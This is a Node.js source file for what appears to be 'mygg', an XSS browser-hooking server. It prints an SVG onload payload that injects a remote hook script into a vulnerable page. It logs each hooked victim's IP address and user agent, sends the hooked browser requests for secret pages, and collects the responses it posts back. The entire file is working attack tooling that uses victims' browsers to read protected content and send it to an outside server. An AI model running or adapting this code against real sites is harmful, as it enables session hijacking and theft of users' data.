var https = require('https');
var fs = require('fs');

var options = {
    mygg_host: 'https://127.0.0.1',
    key: fs.readFileSync('server.key'),
    cert: fs.readFileSync('server.crt')
};

var tasks_pending = [{"id": 1, "method": "GET", "url": "/secret.html", "head": {"Token": "key"}, "body": null},
                     {"id": 2, "method": "GET", "url": "/secret2.html", "head": {"Token": "key"}, "body": null},
                     {"id": 3, "method": "POST", "url": "/secret2.html", "head": {"Content-Type": "application/json"}, "body": '{"test":"asdf"}'},
                     {"id": 4, "method": "POST", "url": "/secret2.html", "head": {"Content-Type": "application/x-www-form-urlencoded"}, "body": "test=asdf&qwer=123"},
                    ]
var tasks_completed = [];

/* The payload that downloads mygg */
hook = '<svg/onload="x=document.createElement(\'script\');'
hook = hook + 'x.src="' + options.mygg_host + '/hook.js";document.head.appendChild(x);">'
console.log("[+] Payload:\r\n" + hook + "\r\n")

/* The web server communicating with the hooked browser */
https.createServer(options, function (req, res) {
    /* Serves the hook file */
    if (req.url == '/hook.js') {
        fs.readFile('./hook.js', function (err, data) {
            res.end(data);
        });
        var hooked_ipaddr = req.connection.remoteAddress.split(':')[3]
        var hooked_useragent = req.headers['user-agent']; 
        console.log("[+] Hooked new browser [" + hooked_ipaddr + "] [" + hooked_useragent + "]");
    /* Hooked browser asks mygg if there are any new jobs for it */
    } else if (req.url == '/polling') {
        res.setHeader('Access-Control-Allow-Origin', '*')
        res.setHeader('Access-Control-Allow-Headers', '*')
        res.setHeader('Content-Type', 'application/json')
        if (tasks_pending.length > 0) {
            data = JSON.stringify(tasks_pending);
            res.writeHead(200);
            res.end(data);
            tasks_pending = []
        } else {
            res.writeHead(404)
            res.end();
        }
    /* Catching the pre-flight request from the hooked browser */
    } else if (req.url == '/responses' && req.method == 'OPTIONS') {
        //console.log("GOT PREFLIGHT")
        res.setHeader('Access-Control-Allow-Origin', '*')
        res.setHeader('Access-Control-Allow-Headers', 'Content-Type')
        res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        res.writeHead(200);
        res.end();
    /* Catching the responses the hooked browser did on mygg's bidding */
    } else if (req.url == '/responses' && req.method == 'POST') {
        res.setHeader('Access-Control-Allow-Origin', '*')
        res.setHeader('Access-Control-Allow-Headers', 'Content-Type')
        res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        res.setHeader('Content-Type', 'application/json')

        var body = ''
        req.on('data', function (chunk) {
            body += chunk;
        });
        req.on('end', function () {
            var result = JSON.parse(body)
            tasks_completed.push(result);
            res.writeHead(200);
            res.end();
        });

    } else {
        res.writeHead(404);
        res.end();
    }
}).listen(443);
